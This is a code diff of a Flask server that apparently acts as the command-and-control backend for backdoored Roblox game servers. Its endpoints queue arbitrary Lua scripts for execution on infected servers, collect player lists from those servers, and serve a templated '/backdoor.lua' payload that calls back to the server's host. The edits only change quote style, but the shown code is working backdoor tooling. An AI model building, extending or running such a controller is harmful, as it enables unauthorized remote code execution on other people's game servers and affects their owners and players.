@@ -18,10 +18,10 @@ users_players = {}
 def module_exists(module_path):
     return os.path.exists(f"{module_path}/id.txt") or os.path.exists(f"{module_path}/script.lua")
 
-@executor.route('/api/execute', methods=['POST'])
+@executor.route("/api/execute", methods=["POST"])
 def web_execute():
     userid = request.args.get("userid")
-    script = request.data.decode('utf-8')
+    script = request.data.decode("utf-8")
 
     with open(f"{PATH}/static/assets/lua/header.lua", encoding="utf8") as convert_file:
         header = convert_file.read()
@@ -31,7 +31,7 @@ def web_execute():
         functions = functions_file.read()
 
     script = f"""pcall(function()
-local plr = game:GetService('Players'):GetPlayerByUserId({userid})
+local plr = game:GetService(\"Players\"):GetPlayerByUserId({userid})
 {header}
 {convert}
 {functions}
@@ -43,10 +43,10 @@ end)"""
         return "OK"
     return "NO CLIENT"
 
-@executor.route('/api/execute_ss', methods=['POST'])
+@executor.route("/api/execute_ss", methods=["POST"])
 def web_execute_ss():
     userid = request.args.get("userid")
-    script = request.data.decode('utf-8')
+    script = request.data.decode("utf-8")
 
     with open(f"{PATH}/static/assets/lua/functions.lua", encoding="utf8") as functions_file:
         functions = functions_file.read()
@@ -61,7 +61,7 @@ end)"""
         return "OK"
     return "NO CLIENT"
 
-@executor.route('/api/execute_module', methods=['POST'])
+@executor.route("/api/execute_module", methods=["POST"])
 def web_execute_module():
     userid = request.args.get("userid")
     username = request.args.get("username")
@@ -88,7 +88,7 @@ local target = "{username}"
         return "OK"
     return "NO CLIENT"
 
-@executor.route('/api/ping', methods=['GET'])
+@executor.route("/api/ping", methods=["GET"])
 def roblox_ping():
     userid = request.args.get("userid")
     if userid not in users:
@@ -100,32 +100,32 @@ def roblox_ping():
 
     return scripts_to_return
 
-@executor.route('/backdoor.lua', methods=['GET'])
+@executor.route("/backdoor.lua", methods=["GET"])
 def backdoor_script():
     with open(f"{PATH}/static/assets/lua/vlua.lua", encoding="utf8") as vlua_script:
         vlua_script = vlua_script.read()
     return render_template("assets/lua/backdoor.lua", endpoint=request.headers.get("Host"), vlua=vlua_script)
 
-@executor.route('/api/players', methods=['GET', 'POST'])
+@executor.route("/api/players", methods=["GET", "POST"])
 def roblox_player_ping():
     userid = request.args.get("userid")
     session = Session(None)
 
-    if request.method == 'GET':
+    if request.method == "GET":
         players = users_players.get(userid, {})
         for player in players:
             players[player]["AvatarUrl"] = session.get_pfp(players[player]["UserId"])
 
         return render_template("players.html", players=players)
 
-    elif request.method == 'POST':
+    elif request.method == "POST":
         if users.get(userid) is not None:
             users_players[userid] = request.json
             return "OK"
 
     return "Connect to a server please!"
 
-@executor.route('/api/modules', methods=['GET'])
+@executor.route("/api/modules", methods=["GET"])
 def roblox_modules_ping():
     pinned = []
     modules = []
@@ -163,7 +163,7 @@ def roblox_modules_ping():
 
     return render_template("modules.html", modules=[*pinned, *modules])
 
-@executor.route('/api/close', methods=['POST'])
+@executor.route("/api/close", methods=["POST"])
 def roblox_close():
     userid = request.headers.get("user-id")
     users.pop(userid, None)
